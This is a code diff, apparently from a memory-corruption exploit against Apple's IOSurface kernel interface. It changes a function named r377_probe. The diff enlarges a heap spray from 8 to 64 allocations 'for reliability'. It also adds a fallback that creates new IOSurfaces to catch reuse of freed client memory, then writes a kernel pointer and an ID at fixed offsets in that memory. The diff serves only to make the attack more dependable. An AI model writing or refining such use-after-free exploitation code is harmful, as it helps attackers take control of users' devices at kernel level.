@@ -15997,9 +15997,11 @@ static void r377_probe(void) {
     memcpy(saved + 88, &kptr_c, 8);
     memcpy(saved + 136, &sid_b, 4);
 
+    /* Larger spray for reliability */
     malloc_zone_t *zone = malloc_default_zone();
-    uint8_t *spray[8] = {0};
-    for (int i = 0; i < 8; i++) {
+    #define R377_SPRAY 64
+    uint8_t *spray[R377_SPRAY] = {0};
+    for (int i = 0; i < R377_SPRAY; i++) {
         spray[i] = (uint8_t*)malloc_zone_malloc(zone, 448);
         memcpy(spray[i], saved, 448);
     }
@@ -16015,8 +16017,31 @@ static void r377_probe(void) {
     int spray_ok = (check88 == kptr_c && check136 == sid_b);
     rlog("  Spray: %s\n", spray_ok ? "HIT" : "MISS");
 
+    /* Fallback: natural reuse via new surface creation */
     if (!spray_ok) {
-        rlog("  Spray missed, aborting\n");
+        rlog("  Trying natural reuse...\n");
+        IOSurfaceRef surf_reuse = IOSurfaceCreate(crprops);
+        if (surf_reuse) {
+            uint32_t rid = IOSurfaceGetID(surf_reuse);
+            IOSurfaceClientRef rcl = clLookup(rid);
+            rlog("    reuse cl=%p old_cl_a=%p same=%s\n",
+                rcl, raw_a, (void*)rcl == (void*)raw_a ? "YES" : "NO");
+            if ((void*)rcl == (void*)raw_a) {
+                uint8_t *rr = (uint8_t*)rcl;
+                memcpy(rr + 88, &kptr_c, 8);
+                memcpy(rr + 136, &sid_b, 4);
+                memcpy(&check88, rr + 88, 8);
+                memcpy(&check136, rr + 136, 4);
+                spray_ok = (check88 == kptr_c && check136 == sid_b);
+                rlog("    Overwrote reuse: spray_ok=%d\n", spray_ok);
+            }
+            if (rcl) clRelease(rcl);
+            CFRelease(surf_reuse);
+        }
+    }
+
+    if (!spray_ok) {
+        rlog("  Both spray and reuse failed\n");
         goto r377_cleanup;
     }
 
@@ -16121,7 +16146,7 @@ static void r377_probe(void) {
     CFRelease(kProp);
 
 r377_cleanup:
-    for (int i = 0; i < 8; i++) if (spray[i]) malloc_zone_free(zone, spray[i]);
+    for (int i = 0; i < R377_SPRAY; i++) if (spray[i]) malloc_zone_free(zone, spray[i]);
     if (cl_b) clRelease(cl_b);
     if (cl_c) clRelease(cl_c);
     if (surf_b) CFRelease(surf_b);
